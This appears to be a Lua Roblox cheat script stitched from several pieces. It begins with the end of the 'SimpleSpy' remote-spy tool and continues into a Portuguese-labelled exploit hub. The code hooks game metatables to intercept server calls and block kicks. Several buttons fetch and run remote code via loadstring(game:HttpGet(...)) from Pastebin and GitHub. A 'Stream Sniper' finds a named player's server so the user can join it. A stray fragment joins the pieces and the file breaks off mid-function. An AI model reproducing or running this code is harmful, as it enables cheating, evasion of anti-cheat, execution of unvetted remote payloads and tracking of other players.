    if (methodName:lower() == "invokeserver" or methodName:lower() == "fireserver") and not (blacklist[remote] or blacklist[remote.Name]) then
        if remoteHooks[remote] then
            args = remoteHooks[remote]({args, unpack(args, 2)})
        end
        local func
        local calling
        if funcEnabled then
            func = debug.getinfo(3).func
            calling = useGetCallingScript and getcallingscript() or nil
        end
        coroutine.wrap(function()
            schedule(remoteHandler, false, methodName, remote, {unpack(args, 2)}, func, calling)
        end)()
    end
    if typeof(remote) == "Instance" and (methodName:lower() == "invokeserver" or methodName:lower() == "fireserver") and (blocklist[remote] or blocklist[remote.Name]) then
        return nil
    elseif (methodName:lower() == "invokeserver" or methodName:lower() == "fireserver") and remoteHooks[remote] then
        return original(unpack(args))
    else
        return original(...)
    end
end)
 
local newFireServer = newcclosure(function(...) return hookRemote("RemoteEvent", ...) end)
 
local newInvokeServer = newcclosure(function(...) return hookRemote("RemoteFunction", ...) end)
 
--- Toggles on and off the remote spy
function toggleSpy()
    if not toggle then
        setreadonly(gm, false)
        if not original then
            original = gm.__namecall
            if not original then
                warn("SimpleSpy: namecall method not found!\n")
                onToggleButtonClick()
                return
            end
        end
        gm.__namecall = newnamecall
        originalEvent = hookfunction(remoteEvent.FireServer, newFireServer)
        originalFunction = hookfunction(remoteFunction.InvokeServer, newInvokeServer)
    else
        setreadonly(gm, false)
        gm.__namecall = original
        hookfunction(remoteEvent.FireServer, originalEvent)
        hookfunction(remoteFunction.InvokeServer, originalFunction)
    end
end
 
--- Toggles between the two remotespy methods (hookfunction currently = disabled)
function toggleSpyMethod()
    toggleSpy()
    toggle = not toggle
end
 
--- Shuts down the remote spy
function shutdown()
    if schedulerconnect then
        schedulerconnect:Disconnect()
    end
    for _, connection in pairs(connections) do
        coroutine.wrap(function()
            connection:Disconnect()
        end)()
    end
    setreadonly(gm, false)
    SimpleSpy2:Destroy()
    hookfunction(remoteEvent.FireServer, originalEvent)
    hookfunction(remoteFunction.InvokeServer, originalFunction)
    gm.__namecall = original
    _G.SimpleSpyExecuted = false
end
 
-- main
if not _G.SimpleSpyExecuted then
    local succeeded, err = pcall(function()
        _G.SimpleSpyShutdown = shutdown
        ContentProvider:PreloadAsync({"rbxassetid://6065821980", "rbxassetid://6065774948", "rbxassetid://6065821086", "rbxassetid://6065821596", ImageLabel, ImageLabel_2, ImageLabel_3})
        onToggleButtonClick()
        RemoteTemplate.Parent = nil
        FunctionTemplate.Parent = nil
        codebox = Highlight.new(CodeBox)
        codebox:setRaw("")
        getgenv().SimpleSpy = SimpleSpy
        TextLabel:GetPropertyChangedSignal("Text"):Connect(scaleToolTip)
        TopBar.InputBegan:Connect(onBarInput)
        MinimizeButton.MouseButton1Click:Connect(toggleMinimize)
        MaximizeButton.MouseButton1Click:Connect(toggleSideTray)
        Simple.MouseButton1Click:Connect(onToggleButtonClick)
        CloseButton.MouseEnter:Connect(onXButtonHover)
        CloseButton.MouseLeave:Connect(onXButtonUnhover)
        Simple.MouseEnter:Connect(onToggleButtonHover)
        Simple.MouseLeave:Connect(onToggleButtonUnhover)
        CloseButton.MouseButton1Click:Connect(shutdown)
        table.insert(connections, UserInputService.InputBegan:Connect(backgroundUserInput))
        table.insert(connections, Mouse.Move:Connect(mouseMoved))
        connectResize()
        SimpleSpy2.Enabled = true
        coroutine.wrap(function()
            wait(1)
            onToggleButtonUnhover()
        end)()
        schedulerconnect = RunService.Heartbeat:Connect(taskscheduler)
        if syn and syn.protect_gui then pcall(syn.protect_gui, SimpleSpy2) end
        SimpleSpy2.Parent = gethui and gethui() or CoreGui
    end)
    if succeeded then
        _G.SimpleSpyExecuted = true
    else
        warn("A fatal error has occured, SimpleSpy was unable to launch properly.\nPlease DM this error message to @exx#9394:\n\n" .. tostring(err))
        SimpleSpy2:Destroy()
        hookfunction(remoteEvent.FireServer, originalEvent)
        hookfunction(remoteFunction.InvokeServer, originalFunction)
        gm.__namecall = original
        return
    end
else
    SimpleSpy2:Destroy()
    return
end
 
----- ADD ONS ----- (easily add or remove additonal functionality to the RemoteSpy!)
--[[
    Some helpful things:
        - add your function in here, and create buttons for them through the 'newButton' function
        - the first argument provided is the TextButton the player clicks to run the function
        - generated scripts are generated when the namecall is initially fired and saved in remoteFrame objects
        - blacklisted remotes will be ignored directly in namecall (less lag)
        - the properties of a 'remoteFrame' object:
            {
                Name: (string) The name of the Remote
                GenScript: (string) The generated script that appears in the codebox (generated when namecall fired)
                Source: (Instance (LocalScript)) The script that fired/invoked the remote
                Remote: (Instance (RemoteEvent) | Instance (RemoteFunction)) The remote that was fired/invoked
                Log: (Instance (TextButton)) The button being used for the remote (same as 'selected.Log')
            }
        - globals list: (contact @exx#9394 for more information or if you have suggestions for more to be added)
            - closed: (boolean) whether or not the GUI is currently minimized
            - logs: (table[remoteFrame]) full of remoteFrame objects (properties listed above)
            - selected: (remoteFrame) the currently selected remoteFrame (properties listed above)
            - blacklist: (string[] | Instance[] (RemoteEvent) | Instance[] (RemoteFunction)) an array of blacklisted names and remotes
            - codebox: (Instance (TextBox)) the textbox that holds all the code- cleared often
]]
-- Copies the contents of the codebox
newButton(
    "Copy Code",
    function() return "Click to copy code" end,
    function()
        setclipboard(codebox:getString())
        TextLabel.Text = "Copied successfully!"
    end
)
 
--- Copies the source script (that fired the remote)
newButton(
    "Copy Remote",
    function() return "Click to copy the path of the remote" end,
    function()
        if selected then
            setclipboard(v2s(selected.Remote))
            TextLabel.Text = "Copied!"
        end
    end
)
 
-- Executes the contents of the codebox through loadstring
newButton(
    "Run Code",
    function() return "Click to execute code" end,
    function()
        local orText = "Click to execute code"
        TextLabel.Text = "Executing..."
        local succeeded = pcall(function() return loadstring(codebox:getString())() end)
        if succeeded then
            TextLabel.Text = "Executed successfully!"
        else
            TextLabel.Text = "Execution error!"
        end
    end
)
 
--- Gets the calling script (not super reliable but w/e)
newButton(
    "Get Script",
    function() return "Click to copy calling script to clipboard\nWARNING: Not super reliable, nil == could not find" end,
    function()
        if selected then
            setclipboard(SimpleSpy:ValueToString(selected.Source))
            TextLabel.Text = "Done!"
        end
    end
)
 
--- Decompiles the script that fired the remote and puts it in the code box
newButton(
    "Function Info",
    function() return "Click to view calling function information" end,
    function()
        if selected then
            if selected.Function then
                codebox:setRaw("-- Calling function info\n-- Generated by the SimpleSpy serializer\n\n" .. tostring(selected.Function))
            end
            TextLabel.Text = "Done! Function info generated by the SimpleSpy Serializer."
        end
    end
)
 
--- Clears the Remote logs
newButton(
    "Clr Logs",
    function() return "Click to clear logs" end,
    function()
        TextLabel.Text = "Clearing..."
        logs = {}
        for _, v in pairs(LogList:GetChildren()) do
            if not v:IsA("UIListLayout") then
                v:Destroy()
            end
        end
        codebox:setRaw("")
        selected = nil
        TextLabel.Text = "Logs cleared!"
    end
)
 
--- Excludes the selected.Log Remote from the RemoteSpy
newButton(
    "Exclude (i)",
    function() return "Click to exclude this Remote" end,
    function()
        if selected then
            blacklist[selected.Remote] = true
            TextLabel.Text = "Excluded!"
        end
    end
)
 
--- Excludes all Remotes that share the same name as the selected.Log remote from the RemoteSpy
newButton(
    "Exclude (n)",
    function() return "Click to exclude all remotes with this name" end,
    function()
        if selected then
            blacklist[selected.Name] = true
            TextLabel.Text = "Excluded!"
        end
    end
)
 
--- clears blacklist
newButton(
    "Clr Blacklist",
    function() return "Click to clear the blacklist" end,
    function()
        blacklist = {}
        TextLabel.Text = "Blacklist cleared!"
    end
)
 
--- Prevents the selected.Log Remote from firing the server (still logged)
newButton(
    "Block (i)",
    function() return "Click to stop this remote from firing" end,
    function()
        if selected then
            blocklist[selected.Remote] = true
            TextLabel.Text = "Excluded!"
        end
    end
)
 
--- Prevents all remotes from firing that share the same name as the selected.Log remote from the RemoteSpy (still logged)
newButton(
    "Block (n)",
    function() return "Click to stop remotes with this name from firing" end,
    function()
        if selected then
            blocklist[selected.Name] = true
            TextLabel.Text = "Excluded!"
        end
    end
)
 
--- clears blacklist
newButton(
    "Clr Blocklist",
    function() return "Click to stop blocking remotes" end,
    function()
        blocklist = {}
        TextLabel.Text = "Blocklist cleared!"
    end
)
 
--- Attempts to decompile the source script
newButton(
    "Decompile",
    function() return "Attempts to decompile source script\nWARNING: Not super reliable, nil == could not find" end,
    function()
        if selected then
            if selected.Source then
                codebox:setRaw(decompile(selected.Source))
                TextLabel.Text = "Done!"
            else
                TextLabel.Text = "Source not found!"
            end
        end
    end
)
 
newButton(
    "Disable Info",
    function() return string.format("[%s] Toggle function info (because it can cause lag in some games)", funcEnabled and "ENABLED" or "DISABLED") end,
    function()
        funcEnabled = not funcEnabled
        TextLabel.Text = string.format("[%s] Toggle function info (because it can cause lag in some games)", funcEnabled and "ENABLED" or "DISABLED")
    end
)
 
newButton(
    "Autoblock",
    function() return string.format("[%s] [BETA] Intelligently detects and excludes spammy remote calls from logs", autoblock and "ENABLED" or "DISABLED") end,
    function()
        autoblock = not autoblock
        TextLabel.Text = string.format("[%s] [BETA] Intelligently detects and excludes spammy remote calls from logs", autoblock and "ENABLED" or "DISABLED")
        history = {}
        excluding = {}
    end
)
 
newButton(
    "CallingScript",
    function() return string.format("[%s] [UNSAFE] Uses 'getcallingscript' to get calling script for Decompile and GetScript. Much more reliable, but opens up SimpleSpy to detection and/or instability.", useGetCallingScript and "ENABLED" or "DISABLED") end,
    function()
        useGetCallingScript = not useGetCallingScript
        TextLabel.Text = string.format("[%s] [UNSAFE] Uses 'getcallingscript' to get calling script for Decompile and GetScript. Much more reliable, but opens up SimpleSpy to detection and/or instability.", useGetCallingScript and "ENABLED" or "DISABLED")
    end
)
 
          end           
        })
local Section = EspTab:AddSection({
	Name = "Esp/Visual"
})
    EspTab:AddButton({
        Name = "Esp V1",
        Callback = function()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/ic3w0lf22/Unnamed-ESP/master/UnnamedESP.lua'))()
          end    
        })
    JogadorTab:AddButton({
        Name = "Explode Hub",
        Callback = function()
            loadstring(game:HttpGetAsync("https://pastebin.com/raw/A34Z7gMx"))()
              end       
        })
local Section = JogadorTab:AddSection({
	Name = "Opção Mapa"
})

    JogadorTab:AddButton({
        Name = "Free Cam",
        Callback = function()
            local allowspeedmove = true
wait(1)
 
local c = workspace.CurrentCamera
local player = game.Players.LocalPlayer
local userInput = game:GetService("UserInputService")
local rs = game:GetService("RunService")
local starterPlayer = game:GetService("StarterPlayer")
--local util = LoadLibrary("RbxUtility")
--local camSync = util.CreateSignal()
 
local selected = false
local speed = 60
local lastUpdate = 0
 
local camera = Instance.new('Part', workspace)
camera.CanCollide = false
camera.Anchored = true
camera.Transparency = 1
camera.Name = 'FreeCam'
camera.Position = player.Character.HumanoidRootPart.Position + Vector3.new(0,5,0)
--rs:BindToRenderStep("CamSync",190,function ()
--	camSync:fire()
--end)
 
c.Changed:connect(function (property)
	if property == "CoordinateFrame" then
--		camSync:fire()
	end
end)
 
function getNextMovement(deltaTime)
	local nextMove = Vector3.new()
	-- Left/Right
	if userInput:IsKeyDown("A") or userInput:IsKeyDown("Left") then
		nextMove = nextMove + Vector3.new(-1,0,0)
	end
	if userInput:IsKeyDown("D") or userInput:IsKeyDown("Right") then
		nextMove = nextMove + Vector3.new(1,0,0)
	end
	-- Forward/Back
	if userInput:IsKeyDown("W") or userInput:IsKeyDown("Up") then
		nextMove = nextMove + Vector3.new(0,0,-1)
	end
	if userInput:IsKeyDown("S") or userInput:IsKeyDown("Down") then
		nextMove = nextMove + Vector3.new(0,0,1)
	end
	-- Up/Down
	if userInput:IsKeyDown("Space") or userInput:IsKeyDown("Q") then
		nextMove = nextMove + Vector3.new(0,1,0)
	end
	if userInput:IsKeyDown("LeftControl") or userInput:IsKeyDown("E") then
		nextMove = nextMove + Vector3.new(0,-1,0)
	end
	return CFrame.new( nextMove * (speed * deltaTime) )
end
 
function onSelected()
	local char = player.Character
	if char then
		local root = camera
		currentPos = root.Position
		selected = true
		lastUpdate = tick()
		c.CameraSubject = root
		player.Character.HumanoidRootPart.Anchored = true
		while selected do
			local delta = tick()-lastUpdate
			local look = (c.Focus.p-c.CoordinateFrame.p).unit
			local move = getNextMovement(delta)
			local pos = root.Position
			root.CFrame = CFrame.new(pos,pos+look) * move
			lastUpdate = tick()
			wait(0.01)
		--	camSync:wait()
		end
		player.Character.HumanoidRootPart.Anchored = false
		c.CameraSubject = player.Character.Humanoid
		root.Velocity = Vector3.new()
	end
end
 
function onDeselected()
	selected = false
end
 
local isOn = true
spawn(onSelected)
 
function onKeyPressed(_,state)
	if state == Enum.UserInputState.Begin then
		isOn = not isOn
		if isOn then
			onSelected()
		else
			onDeselected()
		end
	end
end
 
local mouse = player:GetMouse()
mouse.Button1Down:Connect(function()
	if allowspeedmove then speed = 120 end
end)
mouse.Button1Up:Connect(function()
	speed = 60
end)
 
function ResetCamera()
	camera.Position = player.Character.HumanoidRootPart.Position + Vector3.new(0,5,0)
end
 
game:GetService("ContextActionService"):BindAction("Noclip Toggle",onKeyPressed,false,"r")
game:GetService("ContextActionService"):BindAction("Reset Camera Position",ResetCamera,false,"z")
              end             
        })
    EspTab:AddButton({
        Name = "Esp V2",
        Callback = function()
            loadstring(game:HttpGet(('https://raw.githubusercontent.com/Pedroxz63/espbypedroxz/main/README.md'),true))()
              end      
        })
    JogadorTab:AddButton({
        Name = "Fps Booster",
        Callback = function()
            local decalsyeeted = true -- Leaving this on makes games look shitty but the fps goes up by at least 20.
local g = game
local w = g.Workspace
local l = g.Lighting
local t = w.Terrain
t.WaterWaveSize = 0
t.WaterWaveSpeed = 0
t.WaterReflectance = 0
t.WaterTransparency = 0
l.GlobalShadows = false
l.FogEnd = 9e9
l.Brightness = 0
settings().Rendering.QualityLevel = "Level01"
for i,v in pairs(g:GetDescendants()) do
    if v:IsA("Part") or v:IsA("Union") or v:IsA("MeshPart") then
        v.Material = "Plastic"
v.Reflectance = 0
elseif v:IsA("Decal") and decalsyeeted then 
v.Transparency = 1
elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then 
v.Lifetime = NumberRange.new(0)
    end
end
              end          
})
local Section = JogadorTab:AddSection({
	Name = "Utilitarios"
})
JogadorTab:AddButton({
	Name = "Anti Lag",
	Callback = function()
        settings().Rendering.QualityLevel = 1

function Main(instance)
	if instance:IsA('Part') or instance:IsA('UnionOperation') or instance:IsA('MeshPart') or instance:IsA('CornerWedgePart') or instance:IsA('TrussPart') then
		instance.Material = 'Plastic'
		instance.Reflectance = 0
	elseif instance:IsA('Decal') and instance.Name ~= 'face' then
		instance.Transparency = 1
	elseif instance:IsA('ParticleEmitter') or instance:IsA('Trail') then
		instance.Lifetime = NumberRange.new(0)
	elseif instance:IsA('Explosion') then
		instance.BlastPressure = 1
		instance.BlastRadius = 1
	elseif instance:IsA('ForceField') then
		instance:Destroy()
	elseif instance:IsA('Sparkles') then
		instance:Destroy()
	elseif instance:IsA('Smoke') or instance:IsA('Fire') then
		instance:Destroy()
	end
end

task.spawn(function()
    local Terrain = workspace:FindFirstChildOfClass('Terrain')
    local Lighting = game.Lighting
    Terrain.WaterWaveSize = 0
    Terrain.WaterWaveSpeed = 0
    Terrain.WaterReflectance = 0
    Terrain.WaterTransparency = 0
    Lighting.GlobalShadows = false
    Lighting.FogEnd = 9e9
end)

for i,v in next, game.Lighting:GetDescendants() do
	if v:IsA('BlurEffect') or v:IsA('SunRaysEffect') or v:IsA('ColorCorrectionEffect') or v:IsA('BloomEffect') or v:IsA('DepthOfFieldEffect') then
		v.Enabled = false
	end
end

for i,v in next, game:GetDescendants() do
	Main(v)
end

game.DescendantAdded:Connect(function(child)
	coroutine.wrap(function()
		Main(child)
	end)()
end)
  	end    
})
CarroTab:AddButton({
	Name = "Tp Carro Proximo",
	Callback = function()
        local tool = Instance.new("Tool")
        local player = game.Players.LocalPlayer
        local mouse = player:GetMouse()
        
        tool.Name = "TP Car"
        tool.CanBeDropped = false 
        tool.RequiresHandle = false 
        tool.Parent = player.Backpack
        
        tool.Activated:Connect(function()
            local humanoid = player.Character.Humanoid
        
            if humanoid.SeatPart then
                local car = humanoid.SeatPart.Parent 
        
                if car then
                    local size = car:GetExtentsSize()
                    car:PivotTo(CFrame.new(mouse.Hit.Position + Vector3.yAxis * (size.Y/2)))
                end
            end
        end)
  	end    
})
JogadorTab:AddButton({
	Name = "Tp Item Proximo",
	Callback = function()
        local plr = game.Players.LocalPlayer
        local hrp = plr.Character:WaitForChild('HumanoidRootPart')
        
        for i,v in next, workspace:GetChildren() do
            if v:IsA('Tool') and v.Name:lower() == 'camera' then
                local handle = v:WaitForChild('Handle')
                if not handle then return end
                if (handle.Position.Magnitude - hrp.Position.Magnitude) >= 2000 then
                    return
                end
                hrp.Position = handle.Position
                break
            end
        end
  	end    
})
JogadorTab:AddButton({
	Name = "Anti Fling",
	Callback = function()
      	-- // Constants \\ --
-- [ Services ] --
local Services = setmetatable({}, {__index = function(Self, Index)
    local NewService = game.GetService(game, Index)
    if NewService then
    Self[Index] = NewService
    end
    return NewService
    end})
    
    -- [ LocalPlayer ] --
    local LocalPlayer = Services.Players.LocalPlayer
    
    -- // Functions \\ --
    local function PlayerAdded(Player)
       local Detected = false
       local Character;
       local PrimaryPart;
    
       local function CharacterAdded(NewCharacter)
           Character = NewCharacter
           repeat
               wait()
               PrimaryPart = NewCharacter:FindFirstChild('HumanoidRootPart')
           until PrimaryPart
           Detected = false
       end
    
       CharacterAdded(Player.Character or Player.CharacterAdded:Wait())
       Player.CharacterAdded:Connect(CharacterAdded)
       Services.RunService.Heartbeat:Connect(function()
           if (Character and Character:IsDescendantOf(workspace)) and (PrimaryPart and PrimaryPart:IsDescendantOf(Character)) then
               if PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 or PrimaryPart.AssemblyLinearVelocity.Magnitude > 100 then
                   if Detected == false then
                       game.StarterGui:SetCore('ChatMakeSystemMessage', {
                           Text = 'Fling Exploit detected, Player: ' .. tostring(Player);
                           Color = Color3.fromRGB(255, 200, 0);
                       })
                   end
                   Detected = true
                   for i,v in ipairs(Character:GetDescendants()) do
                       if v:IsA('BasePart') then
                           v.CanCollide = false
                           v.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                           v.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                           v.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
                       end
                   end
                   PrimaryPart.CanCollide = false
                   PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                   PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                   PrimaryPart.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
               end
           end
       end)
    end
    
    -- // Event Listeners \\ --
    for i,v in ipairs(Services.Players:GetPlayers()) do
       if v ~= LocalPlayer then
           PlayerAdded(v)
       end
    end
    Services.Players.PlayerAdded:Connect(PlayerAdded)
    
    local LastPosition = nil
    Services.RunService.Heartbeat:Connect(function()
       pcall(function()
           local PrimaryPart = LocalPlayer.Character.PrimaryPart
           if PrimaryPart.AssemblyLinearVelocity.Magnitude > 250 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 250 then
               PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
               PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
               PrimaryPart.CFrame = LastPosition
    
               game.StarterGui:SetCore('ChatMakeSystemMessage', {
                   Text = 'You were flung. Neutralizing velocity.';
                   Color = Color3.fromRGB(255, 0, 0);
               })
           elseif PrimaryPart.AssemblyLinearVelocity.Magnitude < 50 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 then
               LastPosition = PrimaryPart.CFrame
           end
       end)
    end)
  	end    
})
JogadorTab:AddButton({
	Name = "Anti Kick",
	Callback = function()
        local PlayersService = game:GetService('Players')
        local Metatable = getrawmetatable(game)
        local OldMetatable = Metatable.__namecall
        local Protect = newcclosure or protect_function
        setreadonly(Metatable,false)
        Metatable.__namecall = Protect(function(self,...)
            if getnamecallmethod() == 'Kick' then
                wait(9e9)
                return
            end
            return OldMetatable(self,...)
        end)
        hookfunction(PlayersService.LocalPlayer.Kick,Protect(function()
            wait(9e9)
        end))
  	end  
})
local Section = JogadorTab:AddSection({
	Name = "Outros"
})
JogadorTab:AddButton({
	Name = "Tp Player In Server",
	Callback = function()
      	-- Old Version: https://raw.githubusercontent.com/Acrillis/SynapseX/master/Synapse%20Scripts/StreamSniper.lua
local Screenguini = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local UsernameBox = Instance.new("TextBox")
local TextLabel_3 = Instance.new("TextLabel")
local PlaceIdBox = Instance.new("TextBox")
local StartButton = Instance.new("TextButton")
local TextLabel_4 = Instance.new("TextLabel")
local UsernameLabel = Instance.new("TextLabel")
local TextLabel_5 = Instance.new("TextLabel")
local UserIdLabel = Instance.new("TextLabel")
local GamerPicture = Instance.new("ImageLabel")
local TextLabel_6 = Instance.new("TextLabel")

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local Request = (syn and syn.request) or request

Screenguini.Name = HttpService:GenerateGUID(false)
Screenguini.Parent = game:GetService("CoreGui")

Frame.Parent = Screenguini
Frame.Active = true
Frame.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
Frame.BorderColor3 = Color3.fromRGB(31, 31, 31)
Frame.Draggable = true
Frame.Size = UDim2.new(0, 400, 0, 260)

TextLabel.Parent = Frame
TextLabel.Active = true
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 170, 0)
TextLabel.BorderColor3 = Color3.fromRGB(31, 31, 40)
TextLabel.Size = UDim2.new(0, 400, 0, 40)
TextLabel.Font = Enum.Font.SourceSansLight
TextLabel.Text = "Synapse X Stream Sniper"
TextLabel.TextSize = 24.000

TextLabel_2.Parent = Frame
TextLabel_2.Active = true
TextLabel_2.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
TextLabel_2.BorderColor3 = Color3.fromRGB(31, 31, 31)
TextLabel_2.Position = UDim2.new(0, 10, 0, 49)
TextLabel_2.Size = UDim2.new(0, 150, 0, 20)
TextLabel_2.Font = Enum.Font.SourceSansLight
TextLabel_2.Text = "Username/UserId:"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 16.000

UsernameBox.Name = "UsernameBox"
UsernameBox.Parent = Frame
UsernameBox.BackgroundColor3 = Color3.fromRGB(61, 61, 61)
UsernameBox.BorderColor3 = Color3.fromRGB(31, 31, 31)
UsernameBox.Position = UDim2.new(0, 10, 0, 80)
UsernameBox.Size = UDim2.new(0, 150, 0, 35)
UsernameBox.Font = Enum.Font.SourceSansLight
UsernameBox.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
UsernameBox.PlaceholderText = "Enter Username Here"
UsernameBox.Text = ""
UsernameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
UsernameBox.TextSize = 18.000

TextLabel_3.Parent = Frame
TextLabel_3.Active = true
TextLabel_3.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
TextLabel_3.BorderColor3 = Color3.fromRGB(31, 31, 31)
TextLabel_3.Position = UDim2.new(0, 10, 0, 130)
TextLabel_3.Size = UDim2.new(0, 150, 0, 20)
TextLabel_3.Font = Enum.Font.SourceSansLight
TextLabel_3.Text = "Place Id:"
TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.TextSize = 16.000

PlaceIdBox.Name = "PlaceIdBox"
PlaceIdBox.Parent = Frame
PlaceIdBox.BackgroundColor3 = Color3.fromRGB(61, 61, 61)
PlaceIdBox.BorderColor3 = Color3.fromRGB(31, 31, 31)
PlaceIdBox.Position = UDim2.new(0, 10, 0, 157)
PlaceIdBox.Size = UDim2.new(0, 150, 0, 35)
PlaceIdBox.Font = Enum.Font.SourceSansLight
PlaceIdBox.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
PlaceIdBox.PlaceholderText = "Enter PlaceId Here"
PlaceIdBox.Text = tostring(game.PlaceId) or ""
PlaceIdBox.TextColor3 = Color3.fromRGB(255, 255, 255)
PlaceIdBox.TextSize = 18.000

StartButton.Name = "StartButton"
StartButton.Parent = Frame
StartButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
StartButton.BorderColor3 = Color3.fromRGB(31, 31, 31)
StartButton.Position = UDim2.new(0, 10, 0, 204)
StartButton.Size = UDim2.new(0, 380, 0, 34)
StartButton.Font = Enum.Font.SourceSansLight
StartButton.Text = "Start"
StartButton.TextColor3 = Color3.fromRGB(255, 255, 255)
StartButton.TextSize = 24.000

TextLabel_4.Parent = Frame
TextLabel_4.Active = true
TextLabel_4.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
TextLabel_4.BackgroundTransparency = 1.000
TextLabel_4.BorderColor3 = Color3.fromRGB(31, 31, 31)
TextLabel_4.Position = UDim2.new(0, 200, 0, 49)
TextLabel_4.Size = UDim2.new(0, 0, 0, 20)
TextLabel_4.AutomaticSize = Enum.AutomaticSize.X
TextLabel_4.Font = Enum.Font.SourceSansBold
TextLabel_4.Text = "Username:"
TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.TextSize = 16.000
TextLabel_4.TextWrapped = true
TextLabel_4.TextXAlignment = Enum.TextXAlignment.Left

UsernameLabel.Name = "UsernameLabel"
UsernameLabel.Parent = TextLabel_4
UsernameLabel.Active = true
UsernameLabel.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
UsernameLabel.BackgroundTransparency = 1.000
UsernameLabel.BorderColor3 = Color3.fromRGB(31, 31, 31)
UsernameLabel.Position = UDim2.new(0.5, 0, 0, 0)
UsernameLabel.Size = UDim2.new(0, 150, 0, 20)
UsernameLabel.Font = Enum.Font.SourceSansLight
UsernameLabel.Text = ""
UsernameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
UsernameLabel.TextSize = 16.000
UsernameLabel.TextXAlignment = Enum.TextXAlignment.Left

TextLabel_5.Parent = Frame
TextLabel_5.Active = true
TextLabel_5.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
TextLabel_5.BackgroundTransparency = 1.000
TextLabel_5.BorderColor3 = Color3.fromRGB(31, 31, 31)
TextLabel_5.Position = UDim2.new(0, 200, 0, 69)
TextLabel_5.Size = UDim2.new(0, 0, 0, 20)
TextLabel_5.AutomaticSize = Enum.AutomaticSize.X
TextLabel_5.Font = Enum.Font.SourceSansBold
TextLabel_5.Text = "UserId:"
TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.TextSize = 16.000
TextLabel_5.TextWrapped = true
TextLabel_5.TextXAlignment = Enum.TextXAlignment.Left

UserIdLabel.Name = "UserIdLabel"
UserIdLabel.Parent = TextLabel_5
UserIdLabel.Active = true
UserIdLabel.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
UserIdLabel.BackgroundTransparency = 1.000
UserIdLabel.BorderColor3 = Color3.fromRGB(31, 31, 31)
UserIdLabel.Position = UDim2.new(0.5, 0, 0, 0)
UserIdLabel.Size = UDim2.new(0, 150, 0, 20)
UserIdLabel.Font = Enum.Font.SourceSansLight
UserIdLabel.Text = ""
UserIdLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
UserIdLabel.TextSize = 16.000
UserIdLabel.TextXAlignment = Enum.TextXAlignment.Left

GamerPicture.Name = "GamerPicture"
GamerPicture.Parent = Frame
GamerPicture.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
GamerPicture.Position = UDim2.new(0, 200, 0, 95)
GamerPicture.Size = UDim2.new(0, 97, 0, 97)
GamerPicture.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"

TextLabel_6.Parent = Frame
TextLabel_6.Active = true
TextLabel_6.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
TextLabel_6.BackgroundTransparency = 1.000
TextLabel_6.BorderColor3 = Color3.fromRGB(31, 31, 31)
TextLabel_6.Position = UDim2.new(0, 0, 0, 238)
TextLabel_6.Size = UDim2.new(0, 400, 0, 22)
TextLabel_6.RichText = true
TextLabel_6.Font = Enum.Font.SourceSansLight
TextLabel_6.Text = "Credits: <font color=\"#e30000\">Synapse X Team</font> | Fixed: <font color=\"#6873F6\">Zv_yz#0847</font>"
TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6.TextSize = 19.000
TextLabel_6.TextStrokeTransparency = 0.000

if shared.STREAM_SNIPER then
    shared.STREAM_SNIPER:Destroy()
end
shared.STREAM_SNIPER = Screenguini

local searching = false
local confirm = false

local function HttpGet(url)
    return pcall(HttpService.JSONDecode, HttpService, game:HttpGet(url))
end

local function Status(text, tout)
    StartButton.Text = text

    if tout then
        task.delay(tout, function()
            if StartButton.Text == text then
                searching = false
                StartButton.Text = "Start"
            end
        end)
    end
end

local function getServers(id, cursor)
    local fullurl = "https://games.roblox.com/v1/games/".. id .."/servers/Public?limit=100"
    if cursor then
        fullurl = "&cursor=".. cursor
    end

    return HttpGet(fullurl)
end

local function fetchThumbs(tokens)
    local payload = {
        Url = "https://thumbnails.roblox.com/v1/batch",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Method = "POST",

        Body = {}
    }

    for _, token in ipairs(tokens) do
        table.insert(payload.Body, {
            requestId = "0:".. token ..":AvatarHeadshot:150x150:png:regular",
            type = "AvatarHeadShot",
            targetId = 0,
            token = token,
            format = "png",
            size = "150x150"
        })
    end

    payload.Body = HttpService:JSONEncode(payload.Body)
    local result = Request(payload)
    local s, data = pcall(HttpService.JSONDecode, HttpService, result.Body)
    return s, data and data.data or data
end

local function teleport(placeId, guid)
    TeleportService:TeleportToPlaceInstance(placeId, guid)
end


local threads = 30

StartButton.MouseButton1Click:Connect(function()
    if confirm then
        confirm = false
